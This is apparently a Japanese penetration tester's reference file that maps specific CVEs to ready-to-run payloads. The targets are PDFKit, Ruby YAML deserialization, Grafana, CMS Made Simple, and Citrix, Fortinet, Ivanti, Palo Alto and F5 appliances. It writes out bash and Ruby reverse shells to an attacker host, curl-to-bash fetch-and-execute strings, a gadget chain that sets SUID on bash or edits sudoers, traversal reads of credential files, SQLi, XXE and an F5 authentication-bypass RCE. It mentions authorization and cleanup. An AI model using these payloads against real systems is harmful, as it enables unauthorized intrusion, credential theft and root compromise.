# CVE メモ — 具体的ペイロード・バージョン対応表

汎用手法ファイル（`02_Initial_Access/` / `03_Post_Access_Linux/` 等）には書かない、
**特定のソフトウェア × バージョン限定の具体的ペイロード**をここに集約する。

手法クラスの「シグナル → 次の動作」は各手法ファイルを参照し、
ペイロードの詳細が必要になったときにここを開く。

---

## インデックス

| CVE | 対象 | 影響バージョン | 手法クラス | 参照先（手法ファイル） |
|-----|------|--------------|-----------|------------------|
| CVE-2022-25765 | PDFKit (Ruby gem) | 0.8.6 以下 | URL パラメータへのバックティック注入 → RCE | `../02_Initial_Access/Web_Vulnerabilities/Command_Injection.md` |
| Ruby YAML.load Psych Gadget Chain | Ruby 標準ライブラリ (Psych) | Ruby 2.x〜3.0 / `YAML.load` 使用時 | sudo スクリプト経由デシリアライゼーション → root RCE | `../03_Post_Access_Linux/Sudo_Misconfig.md`（パターン5） |
| CVE-2021-43798 | Grafana | 8.0.0 〜 8.3.0 | プラグイン経由のパストラバーサル → 任意ファイル読取 | `../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md` |
| CVE-2019-9053 | CMS Made Simple | ≤ 2.2.9 | タイムベースブラインド SQLi → ハッシュ抽出 | `../02_Initial_Access/Web_Vulnerabilities/SQLi.md` |
| CVE-2023-3519 | Citrix NetScaler ADC / Gateway | 13.0 < 13.0-91.13 / 13.1 < 13.1-49.13 / 12.1 EOL | スタックバッファオーバーフロー → 認証なし RCE | `../02_Initial_Access/Edge_Appliance_CVEs.md` |
| CVE-2023-4966（Citrix Bleed）| Citrix NetScaler ADC / Gateway | 13.0 < 13.0-92.19 / 13.1 < 13.1-49.15 / 14.1 < 14.1-8.50 | 未初期化メモリリーク → セッショントークン窃取 | `../02_Initial_Access/Edge_Appliance_CVEs.md` |
| CVE-2019-19781 | Citrix NetScaler ADC / Gateway | 10.5 / 11.1 / 12.0 / 12.1 / 13.0 の旧ビルド | パストラバーサル → 任意ファイル読取 → RCE | `../02_Initial_Access/Edge_Appliance_CVEs.md` |
| CVE-2024-21762 | Fortinet FortiOS SSL-VPN | 7.4.0 〜 7.4.2 / 7.2.0 〜 7.2.6 / 7.0.0 〜 7.0.13 / 6.4.0 〜 6.4.14 / 6.2 / 6.0 全般 | Out-of-bound write → 認証なし RCE | `../02_Initial_Access/Edge_Appliance_CVEs.md` |
| CVE-2022-42475 | Fortinet FortiOS SSL-VPN | 7.2.0 〜 7.2.2 / 7.0.0 〜 7.0.8 / 6.4.0 〜 6.4.10 / 6.2 / 6.0 全般 | ヒープオーバーフロー → 認証なし RCE | `../02_Initial_Access/Edge_Appliance_CVEs.md` |
| CVE-2023-27997（XORtigate）| Fortinet FortiOS SSL-VPN | 7.2.0 〜 7.2.4 / 7.0.0 〜 7.0.11 / 6.4.0 〜 6.4.12 / 6.2.0 〜 6.2.14 / 6.0 全般 | ヒープオーバーフロー（XOR 暗号化通信路） → 認証なし RCE | `../02_Initial_Access/Edge_Appliance_CVEs.md` |
| CVE-2023-46805 + CVE-2024-21887 | Ivanti Connect Secure / Policy Secure | 9.x / 22.x 未パッチ世代 | 認証バイパス + コマンドインジェクションのチェーン → RCE | `../02_Initial_Access/Edge_Appliance_CVEs.md` |
| CVE-2024-22024 | Ivanti Connect Secure | 9.x / 22.x（21887 と同世代）| SAML エンドポイントの XXE → 任意ファイル読取・SSRF | `../02_Initial_Access/Edge_Appliance_CVEs.md` |
| CVE-2024-29824 | Ivanti EPM | 2022 SU5 以前 | EPM 管理 Web `RecordGoodApp.aspx` SQLi → MSSQL バックエンド RCE | `../02_Initial_Access/Edge_Appliance_CVEs.md` |
| CVE-2024-3400 | Palo Alto PAN-OS GlobalProtect | 10.2 < 10.2.9-h1 / 11.0 < 11.0.4-h1 / 11.1 < 11.1.2-h3 + テレメトリ有効 | SESSID Cookie 経由の任意ファイル作成 → テレメトリ cron 経由 RCE | `../02_Initial_Access/Edge_Appliance_CVEs.md` |
| CVE-2022-1388 | F5 BIG-IP iControl REST | 13.1.0 〜 13.1.5 / 14.1.0 〜 14.1.4 / 15.1.0 〜 15.1.5 / 16.1.0 〜 16.1.2 / 17.0.0 | hop-by-hop ヘッダー解釈不一致による認証バイパス → `tm/util/bash` RCE | `../02_Initial_Access/Edge_Appliance_CVEs.md` |
| CVE-2023-46747 | F5 BIG-IP TMUI | 13.1.x / 14.1.0 〜 14.1.5 / 15.1.0 〜 15.1.10 / 16.1.0 〜 16.1.4 / 17.0.0 〜 17.1.0 | TMUI の SSRF + 内部 PUT → admin 作成 → RCE | `../02_Initial_Access/Edge_Appliance_CVEs.md` |

---

## CVE-2022-25765 — PDFKit バックティック URL 注入

**対象:** PDFKit gem 0.8.6 以下  
**手法クラス:** OSコマンドインジェクション（URL パラメータ経由）  
**参照:** `../02_Initial_Access/Web_Vulnerabilities/Command_Injection.md`（PDF生成機能のコマンドインジェクション セクション）

### ペイロード

**事前準備（必須）：**
1. リバースシェルスクリプトを HTTP サーバーで配信できる状態にする
2. nc リスナーを起動しておく

```bash
# [Attacker] Step 1: リバースシェルスクリプトを作成
mkdir -p /tmp/www
cat > /tmp/www/rev.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1
EOF

# [Attacker] Step 2: HTTP サーバー起動（スクリプト配信用）
cd /tmp/www
python3 -m http.server 8090

# [Attacker] Step 3: 別ターミナルで nc リスナー起動
nc -lvnp 4444
```

**ブラウザの URL 入力フォームに貼り付けるペイロード:**
```
http://[ATTACKER_IP]:8090/?name= `curl http://[ATTACKER_IP]:8090/rev.sh|bash`
```

**curl で POST する場合（URL エンコード済み）:**
```bash
# [Attacker]
curl -X POST http://[TARGET]/ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'url=http%3A%2F%2F[ATTACKER_IP]%3A8090%2F%3Fname%3D%2520%60curl%20http%3A%2F%2F[ATTACKER_IP]%3A8090%2Frev.sh%7Cbash%60'
```

**[ATTACKER_IP] にはテスター側の到達可能インターフェース（環境によって物理LAN・VPN・専用線等が変わる）の IP を使う（`ip a` で全インターフェース確認）。**

---

### URL 検証バイパス（"You should provide a valid URL!" が返る場合）

アプリ側が URL を検証しており、バックティックのみの入力（例: `` http%20`sleep 5` ``）を弾いてくる場合がある。

**症状：** フォームに `` http%20`sleep 5` `` を送ると "You should provide a valid URL!" などのエラーが返る。

**バイパスの原理：** 多くの URL バリデーションは `scheme://host` の形式が整っているかだけを見る。`%20`（スペースの URL エンコード）をパスまたはクエリパラメータ区切りとして挟むことで、バックティックを「URLの続き」として扱わせつつ、ライブラリにはコマンドとして解釈させられる。

**バイパス形式（テスター管理のサーバーを経由する方法）：**

```
http://[ATTACKER_IP]:[PORT]/%20`curl http://[ATTACKER_IP]:[PORT]/test`
```

- `http://[ATTACKER_IP]:[PORT]/` → バリデーションが通る valid な URL
- `%20` → URL エンコードされたスペース（パスの一部として扱われる）
- `` `curl ...` `` → pdfkit がシェルに渡す際にコマンドとして解釈される

**事前確認（OOB で RCE を確認する手順）：**

```bash
# [Attacker] Step 1: HTTP サーバーを起動してコールバックを待つ
python3 -m http.server [PORT]

# [Attacker] Step 2: フォームに以下を入力して送信
# http://[ATTACKER_IP]:[PORT]/%20`curl http://[ATTACKER_IP]:[PORT]/probe`

# → HTTP サーバーのログに GET /probe が届けば RCE 確定
```

---

### base64 エンコードペイロード（特殊文字・クォートが問題になる場合）

リバースシェルペイロードにシングルクォート・スペース等の特殊文字が含まれると、URL や POST ボディの中でエスケープが崩れることがある。base64 でエンコードしてからデコード＋実行することで回避できる。

**事前準備（必須）：**

```bash
# [Attacker] Step 1: リバースシェルコマンドを base64 エンコード
# Ruby の場合
echo -n "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"[ATTACKER_IP]\",[PORT]))'" | base64 -w 0
# → [BASE64_STRING] が出力される

# bash の場合
echo -n 'bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1' | base64 -w 0
# → [BASE64_STRING] が出力される

# [Attacker] Step 2: nc リスナーを起動
nc -lvnp [PORT]
```

**フォームへの入力（バイパス形式と組み合わせる）：**

```
http://[ATTACKER_IP]:[PORT]/%20`echo [BASE64_STRING] | base64 -d | bash`
```

**ポイント：**

- バックエンドが Ruby なら Ruby ペイロードを選ぶ（`ruby -rsocket ...`）。bash が使えない環境でも Ruby は動くため、言語を合わせることで成功率が上がる
- `-w 0` オプションは base64 出力の改行を抑制する（改行があるとデコードが失敗する）
- base64 文字列自体はシェルメタ文字を含まないため、URL パラメータ内でエスケープの問題が発生しない

### 確認されたバージョン
- PDFKit 0.8.6（Debian Bullseye / Ruby 2.7 環境で確認）
- PDFKit 0.8.7 以降はパッチ済み（URL サニタイズ修正）

---

## Ruby YAML.load Psych Gadget Chain — sudo スクリプト経由 root RCE

**対象:** Ruby 2.x〜3.0 / `YAML.load` を使うスクリプトを sudo NOPASSWD で実行できる環境  
**手法クラス:** デシリアライゼーション悪用（sudo 設定不備）  
**参照:** `../03_Post_Access_Linux/Sudo_Misconfig.md`（パターン5）  
**原理:** `../06_Concepts/YAML_Deserialization.md`

### ペイロード（悪意ある YAML ファイル）

**事前準備（必須）：**

- スクリプトが読み込むファイル名を `cat [スクリプトパス]` で確認する（例: `dependencies.yml`）
- そのファイルが置かれるパス（相対パスならカレントディレクトリ）に書き込み権限があることを確認する
- ファイルを作成するディレクトリに移動してから以下を実行する

```bash
# [Target] ファイル名はスクリプトの YAML.load 引数に合わせて変更する
# 'EOF' をシングルクォートで囲むことでヒアドキュメント内の ! が展開されない
cat << 'EOF' > [スクリプトが読み込むファイル名]
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: x
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/object:Gem::Installer
                     i: x
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
EOF
```

**`git_set:` の値が実行されるコマンド。** 目的に応じて変更する：

| やりたいこと | git_set の値 |
|------------|-------------|
| /bin/bash に SUID を設定（最もシンプル） | `"chmod +s /bin/bash"` |
| /tmp に SUID bash をコピー | `"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"` |
| sudoers に追記（永続的） | `"echo '[USER] ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"` |

**sudo 実行:**
```bash
# [Target] エラーが出ても途中でコマンドが走ることがある
sudo /usr/bin/ruby [スクリプトパス]

# SUID が設定されたか確認
ls -la /bin/bash
# -rwsr-sr-x ... → 成功

# root として実行
/bin/bash -p
```

**原状回復（必須）:**
```bash
# [Target] SUID を元に戻す
chmod -s /bin/bash

# 作成した YAML ファイルを削除
rm [ファイル名]
```

### 確認されたバージョン
- Ruby 2.7.4 / Rubygems 3.x（Debian Bullseye 環境で確認）
- Ruby 3.1 以降は `YAML.load` がデフォルトで安全なロードに変更されているため**動作しない**
  → `ruby --version` で確認してから試す

---

## CVE-2021-43798 — Grafana プラグイン経由パストラバーサル

**対象:** Grafana 8.0.0 〜 8.3.0
**手法クラス:** パストラバーサル（Webルート外ファイル読取）
**参照:** `../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md`

### バージョン確認

```bash
# [Attacker]
curl -s http://[IP]:[PORT]/api/health
# {"commit":"...","database":"ok","version":"8.0.0"}
```

→ `version` が `8.0.0` 〜 `8.3.0` の範囲なら有効。`8.3.1` 以降はパッチ済み。

### ペイロード

プラグイン名は何でもよい（`alertlist`, `text`, `graph`, `table` など、インストール済みプラグインならいずれでも可）。

```bash
# [Attacker] /etc/passwd を取得
curl -s --path-as-is \
  "http://[IP]:[PORT]/public/plugins/alertlist/../../../../../../../../../etc/passwd"

# [Attacker] /etc/hosts を取得（コンテナか否かの確認）
curl -s --path-as-is \
  "http://[IP]:[PORT]/public/plugins/alertlist/../../../../../../../../../etc/hosts"

# [Attacker] Grafana SQLite データベース取得
curl -s --path-as-is \
  "http://[IP]:[PORT]/public/plugins/alertlist/../../../../../../../../../var/lib/grafana/grafana.db" \
  -o grafana.db

# [Attacker] Grafana 設定ファイル取得（secret_key 等が含まれる）
curl -s --path-as-is \
  "http://[IP]:[PORT]/public/plugins/alertlist/../../../../../../../../../etc/grafana/grafana.ini" \
  -o grafana.ini
```

### SQLite データベースからのハッシュ抽出

```bash
# [Attacker] ユーザーテーブルを抽出（CLI）
sqlite3 grafana.db "SELECT id, name, login, email, password, salt FROM user;"

# 出力例:
# 1||admin|admin@localhost|[HEX_HASH]|[SALT]
# 2|[USER]|[USER]|user@domain.local|[HEX_HASH]|[SALT]
```

> GUI ツールとして `sqlitebrowser`（DB Browser for SQLite）でも同様に参照できる。Table: `user` → Browse Data タブ。オフライン・CLI 環境では `sqlite3` を使う。

> `rands` カラムは変換不要。Hashcat 変換に必要なのは `password`（HEX）と `salt` のみ。

→ 取得したハッシュのクラック: `Hashcat.md`（PBKDF2-HMAC-SHA256 / mode 10900）

### 確認されたバージョン
- Grafana 8.3.0（脆弱版）
- Grafana 8.3.1 以降はパッチ済み

---

## CVE-2019-9053 — CMS Made Simple タイムベースブラインド SQLi

**対象:** CMS Made Simple ≤ 2.2.9
**手法クラス:** タイムベースブラインド SQLi（ソルト + MD5 ハッシュ抽出）
**参照:** `../02_Initial_Access/Web_Vulnerabilities/SQLi.md`（タイムベースブラインドSQLi セクション）

### エクスプロイトの取得

```bash
# [Attacker]
searchsploit cms made simple
searchsploit -m php/webapps/46635.py
```

### Python 2系スクリプトを Python 3 で動かす手順

1. `searchsploit -m [PATH]` でスクリプトをカレントディレクトリにコピー
2. `python [script.py]` を実行してエラー確認
3. エラーが出た場合は以下の箇所を修正：
   - `print "..."` → `print("...")`
   - `hashlib.md5(str(salt) + word)` → `hashlib.md5((salt + word).encode()).hexdigest()`
4. 修正後に再実行

### ペイロード構造（タイムベース文字抽出）

抽出の優先順位はソルト → ユーザー名 → メール → パスワードハッシュ。多くのWebアプリは `md5(salt + password)` を使うため、ソルトなしではクラック不可。

```
# ソルト抽出ペイロード例（cms_siteprefs テーブルの sitepref_value から sitemask 行を1文字ずつ抽出）
a,b,1,5))+and+(select+sleep(3)+from+cms_siteprefs+where+sitepref_value+like+0x[HEX_PREFIX]25+and+sitepref_name+like+0x736974656d61736b)+--+
```

### 手動でのタイムベース SQLi 確認

```bash
# [Attacker] 脆弱性の存在確認（3秒遅延するか）
curl -s "http://[TARGET]/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(3))+--+" \
  -o /dev/null -w "%{time_total}\n"
# 3秒以上かかれば SQLi 成立
```

### Python でのパスワードクラック（ソルト付き MD5）

```python
# [Attacker] テスター端末で実行
import hashlib

salt   = "[取得したソルト]"
hash_  = "[取得したMD5ハッシュ]"

with open("/usr/share/wordlists/rockyou.txt", errors="ignore") as f:
    for line in f:
        word = line.strip()
        if hashlib.md5((salt + word).encode()).hexdigest() == hash_:
            print(f"[+] パスワード: {word}")
            break
```

### 注意点・落とし穴
- **DoS保護があるサイトではリクエスト間に遅延を入れる**（`time.sleep(0.5)` 程度）。連続リクエストで接続が切られると抽出が止まる
- スリープ閾値（TIME変数）は環境のレイテンシに合わせて調整。レイテンシが200ms以上なら `TIME=5` 程度に上げる
- 文字セット（dictionary）に不足があると1文字も抽出されずに終わる。エラーなく空文字が返る場合は文字セットを確認
- Python 2 系のエクスプロイトは `hashlib.md5(str(salt) + word)` でバイト/文字列の混在エラーが出る。Python 3 では `.encode()` が必要
- 一部の CMS はセッション管理があり、Cookie なしではクエリが実行されない場合がある

### 確認されたバージョン
- CMS Made Simple 2.2.9 以下が対象
- 2.2.10 以降はパッチ済み

---

# エッジアプライアンス系 CVE（境界デバイス）

> **[HIGH IMPACT 共通注意]** 以下の CVE は **業務停止 / 持続化 / 不可逆設定変更 / SIEM 検知必至** のいずれか（多くは全て）に該当する。本番では **CVE 単位の個別書面承認 + SOC 事前通知 + 業務時間外実施枠** を必ず取得する。検査前のフィンガープリント特定・着火条件は `../02_Initial_Access/Edge_Appliance_CVEs.md` を参照。

---

## CVE-2023-3519 — Citrix NetScaler ADC / Gateway 認証なし RCE

**対象:** NetScaler ADC / Gateway 13.0 < 13.0-91.13 / 13.1 < 13.1-49.13 / 12.1 EOL（12.1 は EOL 後でも残存環境に影響）
**手法クラス:** スタックバッファオーバーフロー（POST ボディの長大値経由）→ 認証なし RCE
**前提:** 装置が **Gateway / AAA virtual server として設定済み**（管理面のみ稼働では非該当）。`/logon/LogonPoint/tmindex.html` が公開されていることがシグナル
**参照:** `../02_Initial_Access/Edge_Appliance_CVEs.md`

### バージョン確認

```bash
# [Attacker] ログインページの隠しビルド情報（CSS / JS のクエリパラメータに版数が付くことがある）
curl -sk https://[TARGET]/logon/themes/Default/css/base.css -I   # [Attacker]
curl -sk https://[TARGET]/vpn/index.html | grep -iE "build|version"   # [Attacker]
```

### 成功シグナル

- 検知系 PoC のレスポンスに **未初期化文字列 / 想定外の Content-Length** が混入
- 装置の `/var/log/ns.log` に「abnormal request」「stack canary」のシグナル（侵害指標）

### PoC リポジトリ（GitHub）

- `Mandiant/Citrix-IOC-Scanner` — 既存侵害の検出専用（攻撃 PoC ではない、防御寄り）
- 完全 RCE PoC は公開リポジトリでは流通が限定的。本番では **検知系 + バージョン照合のみ** で十分

### 確認されたバージョン

- 13.0-91.13 以降 / 13.1-49.13 以降はパッチ済み
- 12.1 系は CVE-2023-3519 のパッチ提供が EOL 扱いでベンダー対応外。残存環境は機器交換推奨

---

## CVE-2023-4966（Citrix Bleed）— NetScaler セッショントークンリーク

**対象:** NetScaler ADC / Gateway 13.0 < 13.0-92.19 / 13.1 < 13.1-49.15 / 14.1 < 14.1-8.50（**Gateway / AAA virtual server として設定済み** であること）
**手法クラス:** 未初期化メモリリーク（OpenID Connect エンドポイント経由の長大 Host ヘッダー）→ 既存セッショントークン窃取 → セッション横取り
**参照:** `../02_Initial_Access/Edge_Appliance_CVEs.md`

### ペイロード（検知系・到達性確認）

```bash
# [Attacker] 異常に長い Host ヘッダーを送って未初期化メモリの内容を引き出す
curl -sk -H "Host: $(python3 -c 'print("A"*24812)')" \
  https://[TARGET]/oauth/idp/.well-known/openid-configuration -i   # [Attacker]

# レスポンスボディの末尾に NSC_ / # / cookie 文字列 / 16進トークン断片が混入していれば該当
```

### セッション横取りの流れ

1. 抽出されたセッショントークン（NetScaler の Cookie 形式）をテスター側ブラウザに植え替え
2. `https://[TARGET]/` にアクセスすると **正規ユーザーの NetScaler セッションを引き継ぐ**
3. MFA は無視される（セッションは認証後の状態）

> Cookie 植え替えの具体手順は `../02_Initial_Access/Web_Vulnerabilities/XSS.md` の「stolen cookie のブラウザ植え替え」セクションが流用可能。

### 成功シグナル

- レスポンスボディに `#` / `=` / 16 進文字列・Base64 形式の断片が含まれる
- 抽出した文字列を Cookie として再送 → NetScaler の管理画面ではなくユーザー画面が見える

### PoC リポジトリ

- `assetnote/exploits`（攻撃 PoC 含む）
- `cisagov/CVE-2023-4966-Detection`（CISA 公式：検知のみ）

### 確認されたバージョン

- 13.0-92.19 以降 / 13.1-49.15 以降 / 14.1-8.50 以降はパッチ済み
- パッチ適用後も **既存セッションは自動失効しない**。**全セッションの強制失効 + LDAP/AD パスワードリセット** を対象組織に依頼

---

## CVE-2019-19781 — NetScaler パストラバーサル

**対象:** NetScaler ADC / Gateway 10.5 / 11.1 / 12.0 / 12.1 / 13.0 の特定ビルド以下（古典的）
**手法クラス:** パストラバーサル（`/vpn/../vpns/cfg/` 配下経由）→ 任意ファイル読取 → 設定ファイル経由 RCE
**参照:** `../02_Initial_Access/Edge_Appliance_CVEs.md`

### バージョン確認 + 検知系

```bash
# [Attacker] smb.conf を読み出せれば該当
curl -sk --path-as-is "https://[TARGET]/vpn/../vpns/cfg/smb.conf"   # [Attacker]
# [global] / workgroup = ... の出力が見えれば該当
```

### PoC リポジトリ

- `projectzeroindia/CVE-2019-19781` / `mpgn/CVE-2019-19781`

### 確認されたバージョン

- 該当機器のパッチビルド以降はパッチ済み（ベンダー Advisory CTX267027 参照）

---

## CVE-2024-21762 — Fortinet FortiOS SSL-VPN out-of-bound write

**対象:** FortiOS 7.4.0 〜 7.4.2 / 7.2.0 〜 7.2.6 / 7.0.0 〜 7.0.13 / 6.4.0 〜 6.4.14 / 6.2.0 〜 6.2.15 / 6.0 全般 + FortiProxy 7.4.0 〜 7.4.2 / 7.2.0 〜 7.2.8 / 7.0.0 〜 7.0.14 / 2.0.0 〜 2.0.13 / 1.x 全般
**手法クラス:** SSL-VPN コンポーネントの不正な Chunked エンコーディング処理 → out-of-bound write → 認証なし RCE
**参照:** `../02_Initial_Access/Edge_Appliance_CVEs.md`

### 検知系のみ（業務影響大のため）

```bash
# [Attacker] BishopFox 提供の到達性 / 脆弱性検知スクリプト
git clone https://github.com/BishopFox/CVE-2024-21762-check.git   # [Attacker]
cd CVE-2024-21762-check
python3 CVE-2024-21762-check.py https://[TARGET]   # [Attacker]
# 検知系のみ。完全 RCE は流通限定（国家攻撃者が先行使用）
```

### 成功シグナル（検知系）

- 特定リクエストでサーバが TCP RST を返す / 5xx ではなくタイムアウト
- 装置の SSL-VPN プロセスが再起動した記録（対象組織側 syslog で観察）

### 確認されたバージョン

- FortiOS 7.4.3 / 7.2.7 / 7.0.14 / 6.4.15 / 6.2.16 以降はパッチ済み
- 6.0 系は EOL。機器交換推奨

---

## CVE-2022-42475 — Fortinet FortiOS SSL-VPN heap overflow

**対象:** FortiOS 7.2.0 〜 7.2.2 / 7.0.0 〜 7.0.8 / 6.4.0 〜 6.4.10 / 6.2.0 〜 6.2.11 / 6.0 全般 + FortiProxy 7.2.0 / 7.0.0 〜 7.0.6
**手法クラス:** SSL-VPN heap overflow → 認証なし RCE
**参照:** `../02_Initial_Access/Edge_Appliance_CVEs.md`

### 検知系

```bash
# [Attacker] 到達性確認（バージョンヘッダー / レスポンス差分による検出）
nuclei -id CVE-2022-42475 -u https://[TARGET]   # [Attacker]
```

### 成功シグナル

- 検査リクエスト後に装置の SSL-VPN ポートが瞬断 → 再接続可能になる（プロセス再起動）
- 国家攻撃者活動の IOC（既存侵害指標）が **ベンダー Advisory FG-IR-22-398 / Mandiant 解析記事** に記載

### PoC リポジトリ

- 完全 RCE PoC は公開リポジトリでの流通が限定的。検知系で版数照合まで進め、RCE は事前合意で個別承認時のみ

### 確認されたバージョン

- 7.2.3 / 7.0.9 / 6.4.11 / 6.2.12 以降はパッチ済み

---

## CVE-2023-27997 — Fortinet FortiOS SSL-VPN "XORtigate"

**対象:** FortiOS 7.2.0 〜 7.2.4 / 7.0.0 〜 7.0.11 / 6.4.0 〜 6.4.12 / 6.2.0 〜 6.2.14 / 6.0 全般
**手法クラス:** SSL-VPN の XOR 暗号化通信路上のヒープオーバーフロー → 認証なし RCE
**参照:** `../02_Initial_Access/Edge_Appliance_CVEs.md`

### 検知系

```bash
# [Attacker]
nuclei -id CVE-2023-27997 -u https://[TARGET]   # [Attacker]
```

### 解析記事

- Lexfo: `lexfo/xortigate-cve-2023-27997` の README に解析詳細。完全 PoC コードは README から省略されているため、解析を読んで自前で再現する性質のもの

### 確認されたバージョン

- 7.2.5 / 7.0.12 / 6.4.13 / 6.2.15 以降はパッチ済み

---

## CVE-2023-46805 + CVE-2024-21887 — Ivanti Connect Secure チェーン

**対象:** Ivanti Connect Secure 9.x / 22.x（22.5R2.2 / 22.6R2.2 等の未パッチ世代）/ Ivanti Policy Secure 同等
**手法クラス:** 認証バイパス（CVE-2023-46805）+ コマンドインジェクション（CVE-2024-21887）のチェーン → 認証なし RCE
**参照:** `../02_Initial_Access/Edge_Appliance_CVEs.md`

### ペイロード（検知系から RCE まで）

```bash
# [Attacker] 認証バイパスの単独確認（本来認証必須のエンドポイントが 200 を返すか）
curl -sk "https://[TARGET]/api/v1/totp/user-backup-code/../../license/keys-status/aaaa"   # [Attacker]
# 200 / Ivanti 内部 API の JSON が返れば 46805 該当

# [Attacker] コマンドインジェクション（21887）— GET の URL パス内コマンド注入
curl -sk "https://[TARGET]/api/v1/totp/user-backup-code/../../license/keys-status/$(python3 -c 'import urllib.parse; print(urllib.parse.quote(";id;"))')"   # [Attacker]
# レスポンスボディに id コマンドの出力（uid=0(root) gid=0(root) ...）が含まれれば RCE 確定
```

### PoC リポジトリ

- `rapid7/metasploit-framework` の `exploit/linux/http/ivanti_connect_secure_rce_cve_2024_21887`（公式モジュール）
- `Chocapikk/CVE-2024-21887`
- `assetnote/exploits` 配下

### 成功シグナル

- 認証必須エンドポイントから 200 + 内部 JSON 返却（バイパス段）
- 注入したコマンドの出力（`id` / `hostname` / `cat /etc/passwd`）がレスポンスに含まれる（RCE 段）

### 原状回復（必須）

```bash
# [Attacker] 注入用に作成された一時ファイル / Web shell を装置側で削除（対象組織実施）
# 装置ログ /var/log/messages / /data/var/dlogs/ の該当時刻のエントリを保全 → 検査試行と侵害指標の区別に必要
```

### 確認されたバージョン

- Ivanti Connect Secure 9.1R18.4 / 22.4R2.3 / 22.5R2.2 / 22.6R2.2 以降は CVE-2024-21887 パッチ済み
- ただし **CVE-2024-22024（XXE）** が同世代に追加で見つかったため、最新累積パッチ適用を推奨

---

## CVE-2024-22024 — Ivanti Connect Secure SAML XXE

**対象:** Ivanti Connect Secure 9.x / 22.x（46805/21887 と同世代）
**手法クラス:** SAML エンドポイントの XML External Entity → 任意ファイル読取・SSRF
**参照:** `../02_Initial_Access/Edge_Appliance_CVEs.md`

### ペイロード

```bash
# [Attacker] 外部エンティティを含む SAML POST
curl -sk -X POST https://[TARGET]/dana-ws/saml20.ws \
  -H "Content-Type: text/xml" \
  --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://[ATTACKER_IP]:[PORT]/probe">]><r>&x;</r>'   # [Attacker]
# テスター側 HTTP リスナーに /probe へのリクエストが到達すれば該当
```

### 確認されたバージョン

- 9.1R14.5 / 9.1R17.3 / 9.1R18.4 / 22.4R2.3 / 22.5R1.2 / 22.5R2.3 / 22.6R2.2 以降はパッチ済み

---

## CVE-2024-29824 — Ivanti EPM SQLi → MSSQL バックエンド RCE

**対象:** Ivanti EPM（Endpoint Manager）2022 SU5 以前
**手法クラス:** EPM 管理 Web の `RecordGoodApp.aspx` SQLi → MSSQL バックエンドで `xp_cmdshell` 経由 RCE
**参照:** `../02_Initial_Access/Edge_Appliance_CVEs.md` / `../02_Initial_Access/MSSQL_Exploitation.md`

### PoC リポジトリ

- `horizon3ai/CVE-2024-29824`

### 成功シグナル

- SQL エラー差分（タイムベース）または `xp_cmdshell` 経由のコマンド出力が JSON で返却

### 確認されたバージョン

- Ivanti EPM 2022 SU6 以降はパッチ済み

---

## CVE-2024-3400 — Palo Alto GlobalProtect arbitrary file create

**対象:** PAN-OS 10.2 < 10.2.9-h1 / 11.0 < 11.0.4-h1 / 11.1 < 11.1.2-h3
**前提:** 装置で **GlobalProtect Gateway または Portal が有効** かつ **デバイステレメトリ機能が有効**（両方の同時有効が必須）
**手法クラス:** SESSID Cookie に traversal 文字列を仕込んで任意ファイル作成 → テレメトリ cron 起動でファイルがシェルとして解釈 → 認証なし RCE
**参照:** `../02_Initial_Access/Edge_Appliance_CVEs.md`

### 検知系（到達性 + 前提条件確認）

```bash
# [Attacker] 前提：GlobalProtect Portal の応答
curl -sk -I https://[TARGET]/global-protect/login.esp   # [Attacker]
# 200 が返れば Portal 有効

# [Attacker] SESSID Cookie に traversal を仕込む（検知系）
curl -sk -b "SESSID=./../../../var/appweb/sslvpndocs/global-protect/portal/images/kedalab-test.txt" \
  https://[TARGET]/ssl-vpn/hipreport.esp   # [Attacker]
# テレメトリ cron が走るタイミング（通常 15 分）でファイル作成 → 別エンドポイントから読み戻し
curl -sk https://[TARGET]/global-protect/portal/images/kedalab-test.txt   # [Attacker]
```

### PoC リポジトリ

- `h4x0r-dz/CVE-2024-3400`
- `W01fh4cker/CVE-2024-3400-RCE-Scanner`（到達性 / 検知系）

### 成功シグナル

- テスター制御パスへの書込ファイルが、後刻別エンドポイントから 200 で取得可能
- テスター側 OAST（Burp Collaborator / interactsh）にコールバック到達

### 原状回復

```bash
# [Attacker] 作成した一時ファイルは対象組織で削除依頼
# 装置側 /opt/pancfg/mgmt/locks/ / /var/log/pan/ の該当時刻ログを保全
```

### 確認されたバージョン

- PAN-OS 10.2.9-h1 / 11.0.4-h1 / 11.1.2-h3 以降はパッチ済み
- テレメトリ機能を無効化することで一時緩和（ベンダー公式緩和策）

---

## CVE-2022-1388 — F5 BIG-IP iControl REST authentication bypass

**対象:** BIG-IP 11.6.x EOL / 12.1.x EOL / 13.1.0 〜 13.1.5 / 14.1.0 〜 14.1.4 / 15.1.0 〜 15.1.5 / 16.1.0 〜 16.1.2 / 17.0.0
**手法クラス:** hop-by-hop ヘッダー（`Connection: X-F5-Auth-Token, X-Forwarded-Host`）の解釈不一致による認証バイパス → `/mgmt/tm/util/bash` に直接到達 → 認証なし RCE
**参照:** `../02_Initial_Access/Edge_Appliance_CVEs.md`

### ペイロード

```bash
# [Attacker] 認証バイパス + tm/util/bash でコマンド実行
curl -sk -X POST https://[TARGET]/mgmt/tm/util/bash \
  -H "Content-Type: application/json" \
  -H "X-F5-Auth-Token: a" \
  -H "Authorization: Basic YWRtaW46" \
  -H "Connection: X-F5-Auth-Token, X-Forwarded-Host" \
  --data '{"command":"run","utilCmdArgs":"-c id"}'   # [Attacker]
